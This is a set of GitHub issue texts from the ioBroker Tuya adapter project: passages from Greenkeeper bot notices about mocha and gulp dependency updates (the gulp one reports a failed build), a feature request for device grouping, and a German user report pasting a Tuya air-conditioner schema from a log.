<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3745" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3745/hovercard">#3745</a>: Fix async calls of <code>this.skip()</code> in "before each" hooks (<a href="https://urls.greenkeeper.io/juergba"><strong>@juergba</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3669" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3669/hovercard">#3669</a>: Enable <code>--allow-uncaught</code> for uncaught exceptions thrown inside hooks (<a href="https://urls.greenkeeper.io/givanse"><strong>@givanse</strong></a>)</li>
</ul>
<p>and some regressions:</p>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3848" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3848/hovercard">#3848</a>: Fix <code>Suite</code> cloning by copying <code>root</code> property (<a href="https://urls.greenkeeper.io/fatso83"><strong>@fatso83</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3816" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3816/hovercard">#3816</a>: Guard against undefined timeout option (<a href="https://urls.greenkeeper.io/boneskull"><strong>@boneskull</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3814" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3814/hovercard">#3814</a>: Update "yargs" in order to avoid deprecation message (<a href="https://urls.greenkeeper.io/boneskull"><strong>@boneskull</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3788" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3788/hovercard">#3788</a>: Fix support for multiple node flags (<a href="https://urls.greenkeeper.io/aginzberg"><strong>@aginzberg</strong></a>)</li>
</ul>
<h2><g-emoji class="g-emoji" alias="book" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d6.png">📖</g-emoji> Documentation</h2>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha-examples">mochajs/mocha-examples</a>: New repository of working examples of common configurations using mocha (<a href="https://urls.greenkeeper.io/craigtaub"><strong>@craigtaub</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3850" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3850/hovercard">#3850</a>: Remove pound icon showing on header hover on docs (<a href="https://urls.greenkeeper.io/jd2rogers2"><strong>@jd2rogers2</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3812" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3812/hovercard">#3812</a>: Add autoprefixer to documentation page CSS (<a href="https://urls.greenkeeper.io/Munter"><strong>@Munter</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3811" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3811/hovercard">#3811</a>: Update doc examples "tests.html" (<a href="https://urls.greenkeeper.io/DavidLi119"><strong>@DavidLi119</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3807" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3807/hovercard">#3807</a>: Mocha website HTML tweaks (<a href="https://urls.greenkeeper.io/plroebuck"><strong>@plroebuck</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3793" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3793/hovercard">#3793</a>: Update config file example ".mocharc.yml" (<a href="https://urls.greenkeeper.io/cspotcode"><strong>@cspotcode</strong></a>)</li>
</ul>
<h2><g-emoji class="g-emoji" alias="nut_and_bolt" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f529.png">🔩</g-emoji> Other</h2>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3830" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3830/hovercard">#3830</a>: Replace dependency "findup-sync" with "find-up" for faster startup (<a href="https://urls.greenkeeper.io/cspotcode"><strong>@cspotcode</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3799" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3799/hovercard">#3799</a>: Update devDependencies to fix many npm vulnerabilities (<a href="https://urls.greenkeeper.io/XhmikosR"><strong>@XhmikosR</strong></a>)</li>
</ul>
</details>

<details>
<summary>Commits</summary>
<p>The new version differs by 28 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/f4fc95a94ec6f2348000465be8f15ac2436260d5"><code>f4fc95a</code></a> <code>Release v6.1.0</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/bd29dbd787145b2e4140da7b6a0a9b24fc9b3eab"><code>bd29dbd</code></a> <code>update CHANGELOG for v6.1.0 [ci skip]</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/aaf2b7249a1675fee105c37d1e679145bee7f50c"><code>aaf2b72</code></a> <code>Use cwd-relative pathname to load config file (#3829)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/b079d24161ead240b5f7ec8dbfbe7449d0380b3b"><code>b079d24</code></a> <code>upgrade deps as per npm audit fix; closes #3854</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/e87c689f9c007b7a9a05b246fa271382b8577d39"><code>e87c689</code></a> <code>Deprecate this.skip() for "after all" hooks (#3719)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/81cfa9072b79fee57ba8fe1b9ddf8d774aa41f2e"><code>81cfa90</code></a> <code>Copy Suite property "root" when cloning; closes #3847 (#3848)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/8aa2fc4ceb765b59e2306ae545204dec3b40eb5c"><code>8aa2fc4</code></a> <code>Fix issue 3714, hide pound icon showing on hover header on docs page (#3850)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/586bf78499b23e5f514b534cf93cf31e53fd0a42"><code>586bf78</code></a> <code>Update JS-YAML to address security issue (#3845)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/d1024a3ea8298dda76afee2196b5f94472538cff"><code>d1024a3</code></a> <code>Update doc examples "tests.html" (#3811)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/1d570e0bfa02c1c35e58872e8dc736a9be36e0bc"><code>1d570e0</code></a> <code>Delete "/docs/example/chai.js"</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/ade8b90a46c641345b67c7979f855bcfbda900d5"><code>ade8b90</code></a> <code>runner.js: "self.test" undefined in Browser (#3835)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/009814704df229b7c38edd0b8c503e701e9bb323"><code>0098147</code></a> <code>Replace findup-sync with find-up for faster startup (#3830)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/d5ba1214574f68211eb663c8a0b1aab6d79a0148"><code>d5ba121</code></a> <code>Remove "package" flag from sample config file because it can only be passes as CLI arg (#3793)</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/a3089ad7215306bc7fb6db5043f404d6cfbb20bf"><code>a3089ad</code></a> <code>update package-lock</code></li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/commit/75430ec1b2e9c688503c0aaf198a908eff5b682a"><code>75430ec</code></a> <code>Upgrade yargs-parser dependency to avoid loading 2 copies of yargs</code></li>
</ul>
<p>There are 28 commits in total.</p>
<p>See the <a href="https://urls.greenkeeper.io/mochajs/mocha/compare/00a895f6ad9c1e4c5500851d6ff875e8254a5e06...f4fc95a94ec6f2348000465be8f15ac2436260d5">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 In the SmartLife app its possible to group device into 1 channel, this would be very useful also for the tuya adapter to adopt this principle.

If the data cannot be receive from tuya itself, I would suggest to have an equal implementation path as the Zigbee and Tradfri adapter were ups create groups and manage the group memberships within the adapter config.

![IMG_6933](https://user-images.githubusercontent.com/7318445/67158072-cfff2f80-f333-11e9-807d-f7da9bf73489.PNG)
 Ich habe heute erfolgreich meine Klimaanlage mit diesem Adapter in Iobroker integrieren können

es handelt sich um eine
TCL XA21 / TAC-12CHSD

aber ich denke es wird genauso mit den nahezu baugleichen Geräten XA51, XA71, XA91 funktionieren

Folgende info aus dem log;
`

new Shema added for product type 2si3Y6O3K2rK9XBr. Please send next line from logfile on disk to developer!
--
2019-08-04 11:30:15.676 - info: tuya.0 {"schema":"[{\"mode\":\"rw\",\"code\":\"Power\",\"name\":\"开关\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_power\",\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"temp_set\",\"name\":\"温度调节\",\"property\":{\"unit\":\"℃\",\"min\":0,\"max\":99,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_temp\",\"id\":2,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"ro\",\"code\":\"temp_current\",\"name\":\"当前温度\",\"property\":{\"unit\":\"℃\",\"min\":-20,\"max\":100,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_sun\",\"id\":3,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"mode\",\"name\":\"模式\",\"property\":{\"range\":[\"auto\",\"cold\",\"hot\",\"wet\",\"wind\"],\"type\":\"enum\"},\"iconname\":\"icon-dp_mode\",\"id\":4,\"type\":\"obj\",\"desc\":\"auto：自动模式(feel)；cold：制冷模式；hot：制热模式；wet：除湿模式；wind：送风模式\"},{\"mode\":\"rw\",\"code\":\"windspeed\",\"name\":\"风量\",\"property\":{\"range\":[\"1\",\"2\",\"3\",\"4\"],\"type\":\"enum\"},\"iconname\":\"icon-dp_wind\",\"id\":5,\"type\":\"obj\",\"desc\":\"1：高；2：中；3：低；4：自动\"},{\"mode\":\"rw\",\"code\":\"mode_ECO\",\"name\":\"经济模式\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-eco\",\"id\":8,\"type\":\"obj\",\"desc\":\"ECO模式\"},{\"mode\":\"ro\",\"code\":\"Fault\",\"scope\":\"fault\",\"name\":\"故障告警\",\"property\":{\"label\":[\"E0\",\"E1\",\"E2\",\"E3\",\"E4\",\"E6\",\"E7\",\"E8\",\"E9\",\"EA\",\"EF\",\"EU\"],\"type\":\"bitmap\",\"maxlen\":12},\"iconname\":\"icon-dp_warming\",\"id\":20,\"type\":\"obj\",\"desc\":\"E0:室内外电控板通信故障;E1:室内环境温度传感器故障;E2:室内盘管温度传感器故障;E3:室外盘管温度传感器故障;E4:系统缺氟;E6:室内电机故障或内机风扇不转;E7:室外环境温度传感器故障;E8:室外排气温度传感器故障;E9:室外IPM变频模块故障/压缩机驱动故障;EA:室外电流传感器故障;EF:室外直流风机故障;EU:室外电压传感器故障（电源电压）\"},{\"mode\":\"rw\",\"code\":\"sleep\",\"name\":\"睡眠模式\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_sleep\",\"id\":101,\"type\":\"obj\",\"desc\":\"睡眠（SLEEP）\"},{\"mode\":\"rw\",\"code\":\"turbo\",\"name\":\"强力模式\",\"property\":{\"type\":\"bool\"},\"id\":102,\"type\":\"obj\",\"desc\":\"强力（TURBO）\"},{\"mode\":\"rw\",\"code\":\"cf\",\"name\":\"温标切换\",\"property\":{\"type\":\"bool\"},\"id\":103,\"type\":\"obj\",\"desc\":\"温标切换，true是华氏度，fasle是摄氏度\"},{\"mode\":\"rw\",\"code\":\"wind_up\",\"name\":\"上下摆风\",\"property\":{\"type\":\"bool\"},\"id\":104,\"type\":\"obj\",\"desc\":\"上下摆风\"},{\"mode\":\"rw\",\"code\":\"wind_left\",\"name\":\"左右摆风\",\"property\":{\"type\":\"bool\"},\"id\":105,\"type\":\"obj\",\"desc\":\"左右摆风\"}]","schemaExt":"[{\"id\":2,\"inputStyle\":\"\",\"inputType\":\"\"},{\"id\":3,\"inputStyle\":\"\",\"inputType\":\"\"}]"}

`
aber auch so kann ich soweit bereits alles steuern
Grüße
Downset 
## The devDependency [gulp](https://github.com/gulpjs/gulp) was updated from `4.0.0` to `4.0.1`.

🚨 [View failing branch](https://github.com/Apollon77/ioBroker.tuya/compare/master...Apollon77:greenkeeper%2Fgulp-4.0.1).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




gulp is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **continuous-integration/travis-ci/push:** The Travis CI build failed ([Details](https://travis-ci.org/Apollon77/ioBroker.tuya/builds/522773477?utm_source=github_status&utm_medium=notification)).
</details>


---

<details>
<summary>Release Notes for v4.0.1</summary>

<h3>Fix</h3>
<ul>
<li>Temporary workaround for <a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="278843578" data-permission-text="Issue title is private" data-url="https://github.com/facebook/Docusaurus/issues/257" data-hovercard-type="issue" data-hovercard-url="/facebook/Docusaurus/issues/257/hovercard" href="https://urls.greenkeeper.io/facebook/Docusaurus/issues/257">facebook/Docusaurus#257</a> (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/9f4a2e9">9f4a2e9</a>) - Closes <a href="https://urls.greenkeeper.io/facebook/Docusaurus/issues/257" data-hovercard-type="issue" data-hovercard-url="/facebook/Docusaurus/issues/257/hovercard">facebook/Docusaurus#257</a></li>
</ul>
<h3>Docs</h3>
<ul>
<li>Fix error in ES2015 usage example (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a4e8d48">a4e8d48</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2099" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2099/hovercard">#2099</a> <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2100" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2100/hovercard">#2100</a></li>
<li>Add temporary notice for 4.0.0 vs 3.9.1 documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/126423a">126423a</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2121" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2121/hovercard">#2121</a></li>
<li>Improve recipe for empty glob array (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/45830cf">45830cf</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2122" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2122/hovercard">#2122</a></li>
<li>Reword standard to default (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/b065a13">b065a13</a>)</li>
<li>Fix recipe typo (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/86acdea">86acdea</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2156" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2156/hovercard">#2156</a></li>
<li>Add front-matter to each file (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d693e49">d693e49</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2109" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2109/hovercard">#2109</a></li>
<li>Rename "Getting Started" to "Quick Start" &amp; update it (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/6a0fa00">6a0fa00</a>)</li>
<li>Add "Creating Tasks" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/21b6962">21b6962</a>)</li>
<li>Add "JavaScript and Gulpfiles" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/31adf07">31adf07</a>)</li>
<li>Add "Working with Files" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/50fafc6">50fafc6</a>)</li>
<li>Add "Async Completion" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ad8b568">ad8b568</a>)</li>
<li>Add "Explaining Globs" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/f8cafa0">f8cafa0</a>)</li>
<li>Add "Using Plugins" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/233c3f9">233c3f9</a>)</li>
<li>Add "Watching Files" documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/f3f2d9f">f3f2d9f</a>)</li>
<li>Add Table of Contents to "Getting Started" directory (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a43caf2">a43caf2</a>)</li>
<li>Improve &amp; fix parts of Getting Started (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/84b0234">84b0234</a>)</li>
<li>Create and link-to a "docs missing" page for LINK_NEEDED references (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/2bd75d0">2bd75d0</a>)</li>
<li>Redirect users to new Getting Started guides (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/53e9727">53e9727</a>)</li>
<li>Temporarily reference gulp@next in Quick Start (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/2cecf1e">2cecf1e</a>)</li>
<li>Fixed a capitalization typo in a heading (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/3d051d8">3d051d8</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2242" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2242/hovercard">#2242</a></li>
<li>Use h2 headers within Quick Start documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/921312c">921312c</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2241" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2241/hovercard">#2241</a></li>
<li>Fix for nested directories references (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/4c2b9a7">4c2b9a7</a>)</li>
<li>Add some more cleanup for Docusaurus (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/6a8fd8f">6a8fd8f</a>)</li>
<li>Temporarily point LINK_NEEDED references to documentation-missing.md (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/df7cdcb">df7cdcb</a>)</li>
<li>API documentation improvements based on feedback (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/0a68710">0a68710</a>)</li>
<li>Update API Table of Contents (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d6dd438">d6dd438</a>)</li>
<li>Add API Concepts documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/8dd3361">8dd3361</a>)</li>
<li>Add Vinyl.isCustomProp() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/40ee801">40ee801</a>)</li>
<li>Add Vinyl.isVinyl() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/25a22bf">25a22bf</a>)</li>
<li>Add Vinyl documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/fc09067">fc09067</a>)</li>
<li>Update watch() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/69c22f0">69c22f0</a>)</li>
<li>Update tree() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ebb9818">ebb9818</a>)</li>
<li>Update task() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/b636a9c">b636a9c</a>)</li>
<li>Update symlink() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d580efa">d580efa</a>)</li>
<li>Update src() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d95b457">d95b457</a>)</li>
<li>Update series() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/4169cb6">4169cb6</a>)</li>
<li>Update registry() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d680487">d680487</a>)</li>
<li>Update parallel() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/dc3cba7">dc3cba7</a>)</li>
<li>Update lastRun() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/363df21">363df21</a>)</li>
<li>Update dest() documentation (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/e447d81">e447d81</a>)</li>
<li>Split API docs into separate markdown files (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a3b8ce1">a3b8ce1</a>)</li>
<li>Fix hash link (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/af4bd51">af4bd51</a>)</li>
<li>Replace some links in Getting Started (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c433c70">c433c70</a>)</li>
<li>Remove temporary workaround for <a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="278843578" data-permission-text="Issue title is private" data-url="https://github.com/facebook/Docusaurus/issues/257" data-hovercard-type="issue" data-hovercard-url="/facebook/Docusaurus/issues/257/hovercard" href="https://urls.greenkeeper.io/facebook/Docusaurus/issues/257">facebook/Docusaurus#257</a> (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/5c07954">5c07954</a>) - Closes <a href="https://urls.greenkeeper.io/facebook/Docusaurus/issues/257" data-hovercard-type="issue" data-hovercard-url="/facebook/Docusaurus/issues/257/hovercard">facebook/Docusaurus#257</a></li>
<li>Added code ticks to "null" where missing (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/cb67319">cb67319</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2243" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2243/hovercard">#2243</a></li>
<li>Fix broken link in lastRun (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d35653e">d35653e</a>)</li>
<li>Add front-matter to documentation-missing page (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a553cfd">a553cfd</a>)</li>
<li>Improve grammar on Concepts (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/01cfcc5">01cfcc5</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2247" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2247/hovercard">#2247</a></li>
<li>Remove spaces around <br> (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c960c1d">c960c1d</a>)</li>
<li>Improve grammar in src (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/eb493a2">eb493a2</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2248" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2248/hovercard">#2248</a></li>
<li>Fix formatting error (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ca6ba35">ca6ba35</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2250" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2250/hovercard">#2250</a></li>
<li>Fix formatting of lastRun (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/8569f85">8569f85</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2251" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2251/hovercard">#2251</a></li>
<li>Add missing link in watch (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/e35bdac">e35bdac</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2252" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2252/hovercard">#2252</a></li>
<li>Fix broken link in tasks (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/6d43750">6d43750</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2253" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2253/hovercard">#2253</a></li>
<li>Improve punctuation in tree (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/8e9fd70">8e9fd70</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2254" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2254/hovercard">#2254</a></li>
<li>Fix mistake in "Splitting a gulpfile" (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/96c353d">96c353d</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2255" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2255/hovercard">#2255</a></li>
<li>Remove front-matter from outdated pages (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c5af6f1">c5af6f1</a>)</li>
<li>Fix broken link in Table of Contents (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/c641369">c641369</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2260" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2260/hovercard">#2260</a></li>
<li>Update the babel dependencies to install &amp; configuration needed (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/7239cf1">7239cf1</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2136" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2136/hovercard">#2136</a></li>
<li>Add "What's new in 4.0" section (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/75ea634">75ea634</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2089" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2089/hovercard">#2089</a> <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2267" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2267/hovercard">#2267</a></li>
<li>Cleanup README for "latest" bump (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/24e202b">24e202b</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2268" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2268/hovercard">#2268</a></li>
<li>Revert "next" reference now that 4.0 is latest (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ed27cbe">ed27cbe</a>)</li>
<li>Add Azure Pipelines badge (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/f3f0548">f3f0548</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2310" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2310/hovercard">#2310</a></li>
<li>Add note about transpilation to "Splitting a Gulpfile" section (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/53b9037">53b9037</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2311" data-hovercard-type="issue" data-hovercard-url="/gulpjs/gulp/issues/2311/hovercard">#2311</a> <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2312" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2312/hovercard">#2312</a></li>
<li>Improve wording of file rename (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/88437f2">88437f2</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2314" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2314/hovercard">#2314</a></li>
</ul>
<h3>Upgrade</h3>
<ul>
<li>Update glob-watcher, gulp-cli, and undertaker dependencies &amp; rimraf devDep (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/d3734d3">d3734d3</a>)</li>
</ul>
<h3>Build</h3>
<ul>
<li>Add node 10 to CI matrices (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a5eac1c">a5eac1c</a>)</li>
<li>Remove jscs &amp; update eslint for code formatting rules (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ad8a2f7">ad8a2f7</a>)</li>
<li>Fix Azure comment (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/34a6d53">34a6d53</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2307" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2307/hovercard">#2307</a></li>
<li>Add Azure Pipelines CI (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/b2c6c7e">b2c6c7e</a>) - Closes <a href="https://urls.greenkeeper.io/gulpjs/gulp/issues/2299" data-hovercard-type="pull_request" data-hovercard-url="/gulpjs/gulp/pull/2299/hovercard">#2299</a></li>
</ul>
<h3>Scaffold</h3>
<ul>
<li>Mark *.png and *.jpg as binary files to git (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/a010db6">a010db6</a>)</li>
<li>Update some links and license year (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/1027236">1027236</a>)</li>
<li>Add tidelift configuration (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/49b5aca">49b5aca</a>)</li>
<li>Add new expense policy (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/9819957">9819957</a>)</li>
<li>Add support-bot template (<a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/9078c49">9078c49</a>)</li>
</ul>
</details>

<details>
<summary>Commits</summary>
<p>The new version differs by 77 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/gulpjs/gulp/commit/ea3bba4fdf9f2b508699f69569d0191b8c5bc10c"><code>ea3bba4</code></a> <code>Release: 4.0.1</code></li>
